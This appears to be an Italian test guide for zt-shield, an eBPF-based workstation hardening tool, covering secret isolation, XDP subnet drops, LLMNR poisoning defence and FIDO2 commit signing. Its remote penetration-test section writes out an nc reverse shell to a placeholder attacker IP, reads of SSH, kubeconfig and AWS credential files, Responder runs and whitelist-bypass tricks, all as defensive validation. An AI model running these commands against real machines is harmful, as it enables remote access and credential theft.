# 🧪 Collaudo sul campo (`zt-shield`)

Procedure per validare i livelli di protezione in un ambiente controllato: i test di rete di base usano i Network Namespaces di Linux (senza macchine esterne richieste), ma è documentata anche la procedura di **penetration test da macchina remota (LAN / Wi-Fi)**.

> **Leggi prima:** [PUNTI_APERTI.md](PUNTI_APERTI.md) elenca i bug noti che rendono alcuni esiti di questo documento diversi da quelli attesi. I più importanti per i test sono:
> - Il drop XDP dei protocolli broadcast controlla solo `dport`, quindi la **risposta** avvelenata di Responder non viene bloccata ([Test 3](#-test-3--broadcast-poisoning--xdp--systemd-resolved)).
> - `block_subnets` scarta le risposte, quindi bloccare la rete del gateway o del DNS disconnette la macchina ([Test 2](#-test-2--drop-di-rete--xdp)).
> - La whitelist è per identità del binario (dev+inode), non per nome processo. I binari in whitelist restano vettori: `git hash-object ~/.kube/config` apre il file ([Test 1](#-test-1--isolamento-segreti--lsm)).

---

## 📋 Matrice dei test

| # | Livello | Minaccia simulata | Esito atteso |
| :--- | :--- | :--- | :--- |
| [1](#-test-1--isolamento-segreti--lsm) | eBPF LSM `file_open` | Script o dipendenza malevola legge `~/.kube/config` | `-EACCES` in `enforce`, evento nel log in `audit` |
| [2](#-test-2--drop-di-rete--xdp) | eBPF XDP | Host ostile sulla stessa LAN | Pacchetti scartati prima dello stack TCP/IP |
| [3](#-test-3--broadcast-poisoning--xdp--systemd-resolved) | XDP + `systemd-resolved` | Responder / Inveigh rubano hash NTLM | Nessuna query broadcast in uscita |
| [4](#-test-4--fido2--ssh-agent) | FIDO2 | Malware con shell firma commit a tuo nome | Fallisce senza il tocco fisico sul token |
| [5](#-test-5--penetration-test-esterno-macchina-remota--lan) | End-to-End / LAN | Scansione porte, drop subnet e post-exploitation da host esterno | Porte stealth, XDP drop da subnet ostile, furto segreti negato |

---

## ⚙️ Preparazione comune

### 1. Prerequisiti

```bash
bash scripts/check_prereqs.sh
```

Lo script esce con codice diverso da zero se manca qualcosa di bloccante. Il requisito che ferma tutto e' **`bpf` nella lista dei moduli LSM attivi**:

```bash
cat /sys/kernel/security/lsm
# Deve contenere "bpf", es: lockdown,capability,landlock,yama,apparmor,ima,evm,bpf
```

Se manca, `bpf` e' compilato nel kernel (`CONFIG_BPF_LSM=y`) ma non attivo. Abilitalo **appendendolo alla lista corrente** in `/etc/default/grub`, non sostituendola:

```bash
CURRENT_LSM="$(cat /sys/kernel/security/lsm)"
sudo cp /etc/default/grub /etc/default/grub.bak
sudo sed -i "s|^GRUB_CMDLINE_LINUX_DEFAULT=\"|GRUB_CMDLINE_LINUX_DEFAULT=\"lsm=${CURRENT_LSM},bpf |" /etc/default/grub
sudo update-grub && sudo reboot
```

In alternativa, senza riavvio e solo per una sessione (non persistente):

```bash
sudo sh -c 'echo "lockdown,capability,landlock,yama,apparmor,ima,evm,bpf" > /sys/kernel/security/lsm'
```

### 2. Configurazione di test

Crea un file di configurazione dedicato. Il profilo `home` parte in **`audit`**: logga ma non blocca, quindi da solo non produce `EACCES`.

```yaml
# /tmp/zt-test.yaml
profile: home        # regole: ssh-keys, cloud-creds, dev-tokens, gpg-keys
mode: enforce        # audit | enforce
user: $USER          # obbligatorio: sotto sudo $HOME è /root
interface: ""        # vuoto = auto (route di default)
block_poisoning: true
log_format: text
rescan_seconds: 10   # più basso del default per vedere gli aggiornamenti durante il test
```

```bash
# Sostituisci $USER con il tuo utente reale
sed "s/\$USER/$(whoami)/" > /tmp/zt-test.yaml <<'YAML'
profile: home
mode: enforce
user: __USER__
block_poisoning: true
log_format: text
rescan_seconds: 10
YAML
```

### 3. Avvio

```bash
sudo ./bin/zt-shield -config /tmp/zt-test.yaml
```

In un altro terminale, per leggere i log:

```bash
sudo journalctl -u zt-shield -f        # se installato come servizio
# oppure, se lanciato a mano:
sudo ./bin/zt-shield -config /tmp/zt-test.yaml
```

**Primo passo obbligatorio dopo l'avvio:** l'hook deve apparire fra i programmi LSM caricati. Se qui non c'e', il servizio e' attivo ma non protegge nulla.

```bash
sudo bpftool prog show | grep -E 'zt_file_open|xdp_shield'
```

Attesi entrambi:

```text
123: prog zt_file_open  tag 0x7e2d5f4b0b0a1c3d  xdp  used 1  name zt_file_open
124: prog xdp_shield     tag 0x9f8e7d6c5b4a3928  xdp  used 1  name xdp_shield
```

Anche i contatori: con `kernel.bpf_stats_enabled=1`, `run_cnt` cresce a ogni invocazione.

```bash
sudo sysctl -w kernel.bpf_stats_enabled=1
sudo bpftool prog show name zt_file_open
```

### 4. File di prova

Il test 1 usa i file che il profilo `home` protegge gia'. Se non ne hai qualcuno, creane uno finto: non leggere il kubeconfig vero durante i test, finche' non hai verificato che l'hook funziona.

```bash
# Verifica cosa e' effettivamente protetto
ls -la ~/.kube/config ~/.ssh/id_* 2>/dev/null
```

---

## 🛡️ Test 1: Isolamento Segreti (eBPF LSM)

Simula uno script o una dipendenza malevola eseguita con i tuoi normali privilegi.

### 1. Percorso non autorizzato

Come utente normale (**non** con `sudo`: l'hook e' globale e non filtra per uid, ma con sudo il confronto fallirebbe per un motivo diverso da quello che stai testando):

```bash
cat ~/.kube/config
python3 -c "print(open('$HOME/.kube/config').read())"
```

* **`mode: enforce`** → `cat: /home/<utente>/.kube/config: Permesso negato` (`EACCES`), anche se il file e' tuo e a `0600`.
* **`mode: audit`** → il file si legge normalmente e l'evento compare comunque nel log. Serve per capire cosa bloccherebbe, prima di bloccarlo davvero.

Log atteso, con il formato reale di `internal/audit/audit.go`:

```text
🚨 [BLOCCATO] regola=cloud-creds PID=48921 comm='cat' exe=/usr/bin/cat inode=9740993
👁️ [AUDIT]   regola=cloud-creds PID=48921 comm='cat' exe=/usr/bin/cat inode=9740993
```

Campi: icona, nome della regola (non un id: la traduzione avviene in Go), PID, `comm` (nome thread, **non** attendibile per la sicurezza), `exe` (path reale del binario, risolto da `/proc/<pid>/exe`), inode.

Se `exe=` e' vuoto, il processo e' gia' terminato quando il demone ha letto l'evento: normale, il dato e' best-effort.

### 2. Percorso autorizzato

```bash
kubectl config view > /dev/null && echo "OK: kubectl legge il file"
helm version --short > /dev/null && echo "OK: helm legge il file"
```

Devono funzionare: `/usr/local/bin/kubectl` e `/usr/local/bin/helm` sono in `cloud-creds`. Se invece ricevi `EACCES`, il binario non e' finito in whitelist: verifica con `exec.LookPath` nel PATH del demone (vedi `PUNTI_APERTI.md`).

### 3. Anti-bypass: rinominare il binario

```bash
cp /usr/bin/cat /tmp/ssh && /tmp/ssh ~/.kube/config
```

**Atteso: resta bloccato.** La whitelist confronta l'inode dell'immagine eseguibile, non il nome: `/tmp/ssh` ha un inode diverso da `/usr/bin/ssh`, che non e' in mappa.

Confronto utile, che mostra perche' il criterio conta:

```bash
# rinominare il PROCESSO, non il binario, non funziona
cp /bin/bash /tmp/x && /tmp/x -c 'cat ~/.kube/config'
# -> comunque bloccato: l'inode e' di bash, non di cat
```

### 4. Anti-bypass: il limite strutturale

Questo **non** e' un test da superare: e' una verifica del limite noto. I binari in whitelist sono lettori di file con opzioni scelte dall'utente.

```bash
git hash-object ~/.kube/config
```

**Atteso: riesce** (o al massimo stampa l'hash dell'oggetto). `git` e' in `ssh-keys` e `dev-tokens`, quindi `exe_file` punta a `/usr/bin/git`, che e' in mappa. La verifica su `exe_file` regge: verifica *chi* apre. Ma *chi* e' scelto da chiunque passi per `git`.

Da qui la regola pratica: **ogni binario in whitelist e' un canale per leggere i file di tutte le regole in cui compare.** Se un tool non ti serve, toglilo dalla regola. Il segreto che regge a root compromised non e' questa whitelist, e' la chiave FIDO2 del [Test 4](#-test-4--fido2--ssh-agent).

### 5. Riconciliazione delle mappe

Il rescan ogni `rescan_seconds` riallinea le mappe. Verifica che aggiunga e rimuova:

```bash
# prima del rescan: nessun log per questo file
echo "segreto" > ~/.aws/credentials
cat ~/.aws/credentials
sleep 12   # > rescan_seconds
cat ~/.aws/credentials   # ora deve generare un evento
```

Poi il caso inverso, che e' quello che `reconcile` risolve:

```bash
rm ~/.aws/credentials   # file rimosso
sleep 12
# La voce sparisce dalla mappa: l'inode puo' essere riassegnato dal filesystem
# a un file diverso, che non deve restare protetto per errore.
sudo bpftool map dump name protected_files | wc -l   # deve calare
```

---

## 🌐 Test 2: Drop di Rete (XDP)

Simula un host ostile che prova a contattarti. Network namespace + veth, quindi tutto in locale.

### 1. Ambiente simulato

```bash
sudo ip netns add attacker-ns
sudo ip link add veth-host type veth peer name veth-att
sudo ip link set veth-att netns attacker-ns

sudo ip addr add 192.168.100.1/24 dev veth-host
sudo ip link set veth-host up

sudo ip netns exec attacker-ns ip link set lo up
sudo ip netns exec attacker-ns ip addr add 192.168.100.2/24 dev veth-att
sudo ip netns exec attacker-ns ip link set veth-att up
```

### 2. Baseline, scudo spento

```bash
sudo ip netns exec attacker-ns ping -c 3 192.168.100.1
```

Atteso: 3 risposte, 0% loss.

### 3. Configurazione per il test

XDP va agganciato a `veth-host`, e la subnet da bloccare va messa **nel file di configurazione**. Non esiste una variabile d'ambiente per l'interfaccia: si usa la chiave `interface`.

```bash
cat > /tmp/zt-xdp.yaml <<'YAML'
profile: home
mode: audit
user: __UTENTE__
interface: veth-host
block_poisoning: true
block_subnets:
  - 192.168.100.0/24
YAML
sed -i "s/__UTENTE__/$(whoami)/" /tmp/zt-xdp.yaml
```

Ferma lo scudo precedente, poi riavvialo:

```bash
sudo pkill -x zt-shield
sudo ./bin/zt-shield -config /tmp/zt-xdp.yaml
```

Atteso all'avvio:

```text
🚫 Subnet bloccata in XDP: 192.168.100.0/24
🔥 XDP attivo su veth-host (poisoning drop: true)
```

### 4. Verifica

```bash
sudo ip netns exec attacker-ns ping -c 3 -W 1 192.168.100.1
```

Atteso: `100% packet loss`, e nel log del demone `🔥 XDP attivo su veth-host`.

**Prova che sia XDP a scartare**, non un firewall: il contatore del programma cresce.

```bash
sudo sysctl -w kernel.bpf_stats_enabled=1
sudo bpftool prog show name xdp_shield      # run_cnt deve crescere
```

Alternativa senza statistiche: `tcpdump` sulla veth mostra i pacchetti **arrivare** e nessuna risposta uscire. Un DROP di XDP avviene in ricezione, quindi il contatore di pacchetti in ingresso cresce anche se il ping non parte.

### 5. Attenzione: blocca anche le risposte

Il drop e' su `saddr`, quindi scarta **anche** le risposte. Blocca `192.168.100.0/24` con la veth: l'attaccante non raggiunge la tua interfaccia e la tua interfaccia non raggiunge l'attaccante, quindi il test passa.

Ma in produzione, se metti la rete del **gateway** o del **DNS** in `block_subnets`, perdi connettivita' e risoluzione. Prima di usare questa feature in un ambiente reale:

```bash
ip route | head -1
```

Se il default gateway e' nella subnet che stai per bloccare, non farlo.

### 6. Copertura di una sola interfaccia

XDP viene agganciato a **una** interfaccia: quella in `interface`, o quella della route di default se vuota. Se la route di default passa per un tunnel (WireGuard, tailscale), il filtro va sul tunnel e chi arriva da Ethernet non incontra nulla.

Verifica quale interfaccia è stata scelta:

```bash
grep 'XDP attivo' /var/log/zt-shield.log 2>/dev/null || sudo journalctl -u zt-shield | grep 'XDP attivo'
ip -brief addr
```

Se hai piu' di una scheda attiva, valuta un attach multi-interfaccia: non è implementato.

### 7. Pulizia

```bash
sudo ip link delete veth-host 2>/dev/null
sudo ip netns delete attacker-ns 2>/dev/null
```

---

## 📡 Test 3: Broadcast Poisoning (XDP + systemd-resolved)

Simula la presenza sulla LAN di Responder o Inveigh in attesa di richieste broadcast.

> **Questo test non verifica il drop XDP.** XDP vede solo i pacchetti **in ingresso**, e il drop attuale controlla solo `dport`: la risposta avvelenata (che arriva con `sport=5355` e `dport` effimero) passa. Ciò che blocchi davvero in uscita è la configurazione di `systemd-resolved`.

### 1. Hardening del resolver

```bash
grep -E 'LLMNR|MulticastDNS' /etc/systemd/resolved.conf
```

Atteso dopo `sudo scripts/harden_system.sh home`:

```text
LLMNR=no
MulticastDNS=no
```

### 2. Osservazione

```bash
sudo tcpdump -i any -n "port 5355 or port 5353"
```

Poi genera una risoluzione destinata a fallire:

```bash
ping -c 1 host-inesistente-xyz.local
```

| Configurazione | tcpdump |
| :--- | :--- |
| Senza hardening | pacchetti UDP verso `224.0.0.252:5355` (LLMNR) |
| Con `LLMNR=no`, `MulticastDNS=no` | **silenzioso**: la richiesta va in unicast al resolver configurato |

### 3. Verifica del drop in ingresso (il bug)

Questo è il test che documenta il limite. Con `block_poisoning: true` e XDP attivo, prova a mandare **verso** di te un pacchetto UDP con porta sorgente 5355, che è la forma di una risposta LLMNR avvelenata:

```bash
sudo ip netns exec attacker-ns sh -c 'echo -n | nc -u -w1 192.168.100.1 5355'
sudo bpftool prog show name xdp_shield     # il contatore non distingue
```

**Atteso: il pacchetto passa.** Il codice droppa sul `dport` (5355) di una richiesta, non sullo `sport` di una risposta. Il fix è una riga in `bpf/zerotrust.c`: verificare `sport` oltre a `dport`. Finché non è fatto, la protezione reale anti-Responder è `LLMNR=no` in `systemd-resolved`, non XDP.

### 4. Difesa in profondità

`harden_system.sh` disabilita anche `avahi-daemon` nei profili `public-wifi` e `paranoid`, che è la seconda fonte di traffico mDNS sulla LAN:

```bash
systemctl is-enabled avahi-daemon   # atteso: disabled
```

---

## 🔑 Test 4: FIDO2 e SSH Agent

Simula un processo con shell che tenta di firmare commit o usare le tue credenziali.

### 1. Configurazione

```bash
bash scripts/setup_fido2.sh
```

Con token FIDO2 genera `~/.ssh/id_ed25519_sk` (`-O resident -O verify-required`). Senza token ripiega su una chiave ED25519 software, che è **più debole**: il segreto è sul disco e chi ha root lo legge. Questo è l'unico punto in cui la protezione si autodistrugge: `verify-required` chiede PIN e tocco a ogni singolo commit, e la tentazione di toglierlo dopo due settimane è forte.

### 2. Firma di un commit

```bash
git commit -m "test sicurezza"
```

| Situazione | Comportamento |
| :--- | :--- |
| Con token e tocco fisico | commit firmato |
| Nessun tocco, in timeout | `gpg.ssh.allowedSignersFile ... signing failed: agent refused operation` |
| Nessun token (chiave software) | firma senza intervento umano |

### 3. Verifica crittografica

```bash
git log -1 --show-signature
```

```text
Good "git" signature for <email> with ED25519-SK key SHA256:...
```

Il messaggio `Good signature` prova la presenza del token, non la correttezza del codice. Un commit firmato resta un vettore di supply chain.

### 4. Agente SSH

```bash
ssh-add -c ~/.ssh/id_ed25519     # solo per chiavi software
```

Ogni uso richiede conferma esplicita. Con chiavi `-sk` non serve: il tocco fisico è già la conferma.

Limite da conoscere: `-c` protegge contro un processo non privilegiato che eredita `SSH_AUTH_SOCK`. Contro un attaccante con root non vale.

---

## 🎯 Test 5: Penetration Test Esterno (Macchina Remota / LAN)

Simula un attaccante presente sulla stessa rete fisica o wireless (es. un secondo PC con Kali Linux o un Raspberry Pi). Questo scenario convalida la difesa a strati: hardening perimetrale, drop a livello kernel (XDP) e protezione post-compromissione (LSM).

### 1. Configurazione per interfaccia reale

A differenza dei test in namespace locale, qui lo scudo deve agganciarsi alla reale interfaccia di rete (Wi-Fi o Ethernet).

Identifica l'interfaccia attiva:
```bash
ip -brief addr
```

Crea il file `/tmp/zt-remote-test.yaml`:
```bash
cat > /tmp/zt-remote-test.yaml <<'YAML'
profile: public-wifi
mode: enforce
user: __UTENTE__
interface: wlan0     # sostituisci con la tua interfaccia (es. wlan0 o eth0)
block_poisoning: true
block_subnets:
  - 192.168.1.50/32  # opzionale: IP esatto della macchina attaccante
YAML
sed -i "s/__UTENTE__/$(whoami)/" /tmp/zt-remote-test.yaml
```

Avvia `zt-shield`:
```bash
sudo ./bin/zt-shield -config /tmp/zt-remote-test.yaml
```

### 2. Vettori di Rete Diretti (Dall'attaccante verso la workstation)

#### A. Scansione porte e Stealth check
Dalla macchina attaccante:
```bash
nmap -sS -Pn -p- <IP_WORKSTATION>
```
* **Atteso:** Tutte le porte risultano `filtered` o chiuse senza leak di banner di sistema (grazie a UFW `deny incoming` e ai parametri `sysctl` anti-fingerprinting).

#### B. Drop XDP da subnet / IP ostile
Dalla macchina attaccante (se il suo IP è in `block_subnets`):
```bash
ping -c 3 <IP_WORKSTATION>
curl -m 2 http://<IP_WORKSTATION>
```
* **Atteso:** `100% packet loss` e timeout immediato. I pacchetti vengono scartati all'ingresso a livello driver XDP prima ancora di raggiungere il firewall UFW o lo stack TCP/IP.
* **Verifica sulla workstation:**
  ```bash
  sudo bpftool prog show name xdp_shield  # run_cnt cresce a ogni pacchetto
  ```

#### C. LAN Poisoning (Responder)
Dalla macchina attaccante:
```bash
sudo responder -I <interfaccia_attaccante> -rdwv
```
Dalla workstation bersaglio, genera una richiesta di rete non risolvibile:
```bash
ping host-inesistente-xyz.local
```
* **Atteso:** Nessuna cattura di hash NTLM o credenziali su Responder. `systemd-resolved` (con `LLMNR=no` e `MulticastDNS=no`) impedisce l'invio di query broadcast in chiaro sulla rete.

### 3. Vettore Post-Compromissione (Simulazione Remote Shell)

I segreti su disco (`~/.ssh`, `~/.kube`, token cloud) risiedono in locale e non sono esposti direttamente in rete. Per collaudare **eBPF LSM** e **FIDO2** in uno scenario end-to-end simulando un attaccante che ha ottenuto una shell remota:

#### A. Avvio reverse shell di test
Simula una compromissione (es. dipendenza malevola o vulnerabilità che apre una reverse shell come utente ordinario):
```bash
# Sulla macchina attaccante:
nc -lvnp 4444

# Dalla workstation bersaglio (come utente ordinario, NON con sudo):
nc <IP_ATTACCANTE> 4444 -e /bin/bash
```

#### B. Tentativo di esfiltrazione segreti (LSM in enforce)
Dalla reverse shell remota sull'attaccante:
```bash
cat ~/.ssh/id_ed25519
cat ~/.kube/config
python3 -c "print(open('/home/$USER/.aws/credentials').read())"
```
* **Atteso:** `Permesso negato` (`EACCES`). Anche se l'attaccante controlla la shell utente, il kernel eBPF LSM intercetta la `file_open` e la blocca perché il binario chiamante non è in whitelist.
* **Log visibile sulla workstation:**
  ```text
  🚨 [BLOCCATO] regola=cloud-creds PID=... comm='cat' exe=/usr/bin/cat inode=...
  ```

#### C. Tentativo di firma o uso credenziali Git / SSH (FIDO2)
Dalla reverse shell remota:
```bash
git commit -m "commit iniettato da attaccante remoto"
```
* **Atteso:** Il comando si blocca in attesa del tocco fisico sulla chiavetta hardware FIDO2 inserita nel computer della vittima. Senza tocco fisico, l'operazione va in timeout e fallisce.

### ⚠️ Note importanti per il test esterno:
* **Interfaccia corretta:** Se la route di default passa per un tunnel/VPN, XDP non filtrerà il traffico proveniente dalla LAN a meno che non specifichi esplicitamente l'interfaccia fisica (`interface: wlan0` o `eth0`).
* **Isolamento gateway:** Non inserire l'intera subnet della LAN locale in `block_subnets` se il router/gateway o il DNS condividono la stessa subnet, altrimenti la postazione perderà la connettività.

---

## 📊 Ispezionare le mappe a runtime

Utile per capire cosa è effettivamente protetto e cosa è in whitelist.

```bash
# Programmi caricati
sudo bpftool prog show

# Statistiche (attiva con: sudo sysctl -w kernel.bpf_stats_enabled=1)
sudo bpftool prog show name zt_file_open

# Contenuto delle mappe
sudo bpftool map dump name protected_files   # file protetti
sudo bpftool map dump name allowed_exes      # binari autorizzati
sudo bpftool map dump name infected_subnets  # subnet bloccate
sudo bpftool map dump name settings          # enforce / poisoning

# Verificare che una chiave specifica sia in mappa
sudo bpftool map lookup name protected_files \
  key 0x$(printf '%x' $(stat -c %i ~/.kube/config)) \
      0x$(python3 -c "d=$(stat -c %d ~/.kube/config); print(hex(((d>>20)&0xfff)<<20 | (d&0xfffff))[2:])") \
      0x0 0x0 4
```

`settings[0]` è la modalità (0 = audit, 1 = enforce), `settings[1]` il drop poisoning. Se `settings[0] = 0` e ti aspettavi il blocco, il problema è la modalità, non l'hook.

---

## ✅ Checklist di collaudo

- [ ] `check_prereqs.sh` esce con 0
- [ ] `bpf` presente in `/sys/kernel/security/lsm`
- [ ] `bpftool prog show` elenca `zt_file_open` e `xdp_shield`
- [ ] `cat ~/.kube/config` in `enforce` → `EACCES`
- [ ] `kubectl config view` → funziona
- [ ] `cp /usr/bin/cat /tmp/ssh && /tmp/ssh ~/.kube/config` → bloccato
- [ ] `git hash-object ~/.kube/config` → **riesce** (limite noto, non un fallimento)
- [ ] `ping` dal netns → `100% loss` con `block_subnets` impostata
- [ ] contatori di `xdp_shield` in crescita
- [ ] `tcpdump` muto su 5355/5353 dopo `LLMNR=no`
- [ ] risposta LLMNR in ingresso → **passa** (limite noto)
- [ ] `git commit` senza tocco → fallisce col token
- [ ] Pentest esterno: scansione stealth nmap, drop XDP da host ostile, esfiltrazione segreti negata via reverse shell

---

## 🧹 Rollback

```bash
sudo systemctl stop zt-shield     # stacca entrambi gli hook
# oppure, se lanciato a mano
sudo pkill -x zt-shield
```

I programmi spariscono da `bpftool prog show` e la macchina torna come prima. Non resta configurazione persistita: **se fermi il servizio, non sei più protetto**, senza pinning in bpffs.

Per ripristinare il resolver:

```bash
sudo cp /etc/systemd/resolved.conf.zt-backup /etc/systemd/resolved.conf
sudo systemctl restart systemd-resolved
```
